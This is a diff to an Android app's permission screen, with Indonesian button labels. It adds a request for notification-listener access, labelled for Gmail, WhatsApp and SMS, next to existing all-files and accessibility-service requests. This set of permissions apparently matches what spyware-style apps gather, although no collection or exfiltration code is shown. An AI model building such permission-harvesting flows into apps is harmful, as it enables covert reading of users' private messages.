@@ -103,7 +103,13 @@ class MainActivity : ComponentActivity() {
                             onRequest = { requestAll(); refreshKey++ },
                             onCheck = { grantedAll = checkAll(); refreshKey++ },
                             onAllFiles = { requestAllFilesAccess(); refreshKey++ },
-                            onAccessibility = { requestAccessibility(); refreshKey++ }
+                            onAccessibility = { requestAccessibility(); refreshKey++ },
+                            onNotifAccess = {
+                                try {
+                                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                                } catch (_: Exception) {}
+                                refreshKey++
+                            }
                         )
                     }
                 }
@@ -176,7 +182,7 @@ class MainActivity : ComponentActivity() {
         } catch (_: Exception) {}
     }
 
-    fun requestAllFilesAccess() {
+    private fun requestAllFilesAccess() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 try {
@@ -192,7 +198,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    fun requestAccessibility() {
+    private fun requestAccessibility() {
         try {
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         } catch (_: Exception) {}
@@ -243,6 +249,9 @@ class MainActivity : ComponentActivity() {
     }
 }
 
+// ============================================================
+// SPLASH SCREEN
+// ============================================================
 @Composable
 fun SplashScreen(onDone: () -> Unit) {
     LaunchedEffect(Unit) {
@@ -263,6 +272,9 @@ fun SplashScreen(onDone: () -> Unit) {
     }
 }
 
+// ============================================================
+// PERMISSION SCREEN
+// ============================================================
 @Composable
 fun PermissionScreen(
     perms: Array<String>,
@@ -270,7 +282,8 @@ fun PermissionScreen(
     onRequest: () -> Unit,
     onCheck: () -> Unit,
     onAllFiles: () -> Unit,
-    onAccessibility: () -> Unit
+    onAccessibility: () -> Unit,
+    onNotifAccess: () -> Unit
 ) {
     val ctx = LocalContext.current
 
@@ -336,7 +349,17 @@ fun PermissionScreen(
                 enabled.contains("${ctx.packageName}/.AppLockAccessibilityService") ||
                         enabled.contains("${ctx.packageName}/${AppLockAccessibilityService::class.java.name}")
             } catch (_: Exception) { false }
-            PermRow("Accessibility Service", accessibilityOk)
+            PermRow("Accessibility Service (Lock App)", accessibilityOk)
+
+            // Notification Listener Access
+            val notifOk = try {
+                val enabled = Settings.Secure.getString(
+                    ctx.contentResolver,
+                    "enabled_notification_listeners"
+                ) ?: ""
+                enabled.contains(ctx.packageName)
+            } catch (_: Exception) { false }
+            PermRow("Notification Access (Gmail/WA/SMS)", notifOk)
         }
 
         Spacer(Modifier.height(16.dp))
@@ -348,7 +371,7 @@ fun PermissionScreen(
             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)),
             shape = RoundedCornerShape(10.dp)
         ) {
-            Text("BUKA ALL FILES ACCESS", color = Color(0xFF00FF66), fontSize = 13.sp, fontWeight = FontWeight.Bold)
+            Text("BUKA ALL FILES ACCESS", color = Color(0xFF00FF66), fontSize = 12.sp, fontWeight = FontWeight.Bold)
         }
         Spacer(Modifier.height(8.dp))
         Button(
@@ -357,7 +380,16 @@ fun PermissionScreen(
             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)),
             shape = RoundedCornerShape(10.dp)
         ) {
-            Text("BUKA ACCESSIBILITY SETTINGS", color = Color(0xFF00FF66), fontSize = 13.sp, fontWeight = FontWeight.Bold)
+            Text("BUKA ACCESSIBILITY SETTINGS", color = Color(0xFF00FF66), fontSize = 12.sp, fontWeight = FontWeight.Bold)
+        }
+        Spacer(Modifier.height(8.dp))
+        Button(
+            onClick = onNotifAccess,
+            modifier = Modifier.fillMaxWidth().height(46.dp),
+            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)),
+            shape = RoundedCornerShape(10.dp)
+        ) {
+            Text("BUKA NOTIFICATION ACCESS", color = Color(0xFFFF9800), fontSize = 12.sp, fontWeight = FontWeight.Bold)
         }
 
         Spacer(Modifier.height(16.dp))
@@ -408,6 +440,9 @@ fun PermRow(label: String, ok: Boolean) {
     }
 }
 
+// ============================================================
+// GRANT DONE SCREEN
+// ============================================================
 @Composable
 fun GrantDoneScreen(onContinue: () -> Unit) {
     Column(
